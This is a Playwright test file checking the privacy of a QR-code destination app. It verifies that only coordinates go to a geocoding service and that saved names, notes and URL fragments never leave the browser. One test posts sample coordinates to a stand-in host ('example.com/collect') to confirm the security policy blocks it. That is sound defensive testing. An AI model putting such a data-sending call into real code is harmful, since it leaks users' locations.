import { ADDRESS, expect, test } from './fixtures';

// These run against the production build, with its Content-Security-Policy.

test('making and saving a QR only sends coordinates, and only to the address lookup', async ({
  page,
  photonRequests,
}) => {
  await page.goto('./');
  await page.waitForLoadState('networkidle');

  const requests: string[] = [];
  page.on('request', (request) => requests.push(request.url()));

  await page.getByLabel('Where to?').fill('https://www.google.com/maps/@41.0342,28.9844,15z');
  await expect(page.getByText(ADDRESS)).toBeVisible();
  await page.getByLabel(/^Name/).fill('EvimizX7');
  await page.getByLabel(/^Note/).fill('KapiKoduQ9');
  await page.getByRole('button', { name: 'Save', exact: true }).click();
  await page.getByRole('button', { name: /^EvimizX7/ }).click();

  // Our own static files may still load (e.g. the font with ı, ğ, ş once the address shows),
  // but nothing goes to any other site, and no request carries what was typed.
  const ownSite = new URL(page.url()).origin;
  const elsewhere = requests.filter(
    (url) => !url.startsWith(`${ownSite}/`) && !url.startsWith('https://photon.komoot.io/'),
  );
  expect(elsewhere).toEqual([]);
  for (const url of requests.filter((u) => u.startsWith(ownSite))) {
    expect(url).not.toMatch(/41\.0342|28\.9844|EvimizX7|KapiKoduQ9/);
  }
  expect(photonRequests).toEqual(['https://photon.komoot.io/reverse?lat=41.0342&lon=28.9844&limit=1']);
});

test('the page cannot send data anywhere else', async ({ page }) => {
  await page.goto('./');
  const outcome = await page.evaluate(() =>
    fetch('https://example.com/collect', { method: 'POST', body: 'Ev, 41.0342, 28.9844' }).then(
      () => 'sent',
      () => 'blocked',
    ),
  );
  expect(outcome).toBe('blocked');
});

test('the driver screen looks nothing up, and the destination never reaches the server', async ({
  page,
  photonRequests,
}) => {
  const served: string[] = [];
  page.on('request', (request) => served.push(request.url()));
  await page.goto(`./#v=1&lat=41.0342&lon=28.9844&a=${encodeURIComponent(ADDRESS)}`);
  await expect(page.getByRole('heading', { name: ADDRESS })).toBeVisible();
  // URLs as sent on the wire never include the part after "#".
  for (const url of served) expect(url).not.toMatch(/41\.0342|28\.9844|Sıraselviler|S%C4%B1raselviler/);
  expect(photonRequests).toEqual([]);
});
